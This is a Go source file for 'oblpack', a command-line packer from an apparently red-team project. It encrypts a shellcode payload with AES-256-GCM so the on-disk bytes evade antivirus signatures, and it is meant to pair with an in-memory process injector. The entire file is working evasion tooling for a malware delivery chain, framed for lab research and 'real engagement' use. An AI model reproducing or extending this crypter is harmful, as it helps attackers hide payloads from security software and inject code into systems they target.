// Command oblpack wraps a shellcode payload in the research.Pack envelope
// (magic || nonce || AES-256-GCM) so the on-disk bytes match no public
// signature. Start the injector with the same key via --payload-key and it
// unwraps the payload in memory, right before the W^X injection.
//
//	oblpack -key 'lab-passphrase' -in payloads/research_signal.bin
//
// The key is hashed with SHA-256 (research.DeriveKey); use a random key for a
// real engagement rather than a memorable passphrase.
package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/DevCop95/obliteratus/internal/research"
)

func main() {
	key := flag.String("key", "", "packing passphrase (hashed to a 32-byte AES-256 key)")
	in := flag.String("in", "payloads/research_signal.bin", "input payload file")
	out := flag.String("out", "", "output file (default: <in>.packed)")
	flag.Parse()

	if *key == "" {
		fatalf("-key is required")
	}
	plain, err := os.ReadFile(*in)
	if err != nil {
		fatalf("read %s: %v", *in, err)
	}
	if len(plain) == 0 {
		fatalf("payload %s is empty", *in)
	}

	packed, err := research.Pack(research.DeriveKey(*key), plain)
	if err != nil {
		fatalf("pack: %v", err)
	}
	outPath := *out
	if outPath == "" {
		outPath = *in + ".packed"
	}
	if err := os.WriteFile(outPath, packed, 0o600); err != nil {
		fatalf("write %s: %v", outPath, err)
	}
	fmt.Printf("packed %s (%d B) -> %s (%d B)\n", *in, len(plain), outPath, len(packed))
}

func fatalf(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "oblpack: "+format+"\n", args...)
	os.Exit(1)
}
